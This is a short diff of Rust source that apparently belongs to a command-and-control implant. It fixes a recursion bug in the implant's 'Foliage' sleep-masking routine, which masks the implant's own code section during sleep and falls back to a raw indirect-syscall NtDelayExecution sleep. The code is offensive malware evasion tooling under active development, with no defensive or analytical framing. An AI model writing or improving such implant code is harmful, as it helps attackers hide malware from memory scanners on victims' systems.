@@ -45,14 +45,21 @@ pub fn foliage_enabled() -> bool {
 /// the plain NoMask sleep — never crashes.
 pub fn sleep(seconds: u32) {
     if !foliage_enabled() {
-        crate::kits::sleep(seconds);
+        // Disarmed: raw sleep, NOT kits::sleep. The active kit is Foliage, so
+        // kits::sleep → Foliage::sleep_masked → sleep::sleep → infinite recursion.
+        // Bypass the kit: beacon::sleep_seconds is the raw indirect-syscall sleep.
+        crate::beacon::sleep_seconds(seconds);
         return;
     }
     // ---- ARMED PATH (gated) ------------------------------------------------
+    // NOTE: the degrade paths below call crate::beacon::sleep_seconds DIRECTLY
+    // (raw NtDelayExecution), NOT crate::kits::sleep — because kits::sleep
+    // routes back through Foliage::sleep_masked → sleep::sleep → infinite
+    // recursion → STATUS_STACK_OVERFLOW. The floor sleep bypasses the kit.
     let region = match unsafe { own_text_region() } {
         Some(r) => r,
         None => {
-            crate::kits::sleep(seconds); // degrade: can't resolve .text
+            crate::beacon::sleep_seconds(seconds); // degrade: can't resolve .text
             return;
         }
     };
@@ -167,7 +174,8 @@ fn execute_foliage_plan(plan: &FoliagePlan) {
     let rt = match crate::syscalls::global() {
         Some(rt) => rt,
         None => {
-            crate::kits::sleep(plan_seconds(plan));
+            // Degrade: raw sleep, NOT kits::sleep (would re-enter Foliage → recursion).
+            crate::beacon::sleep_seconds(plan_seconds(plan));
             return;
         }
     };
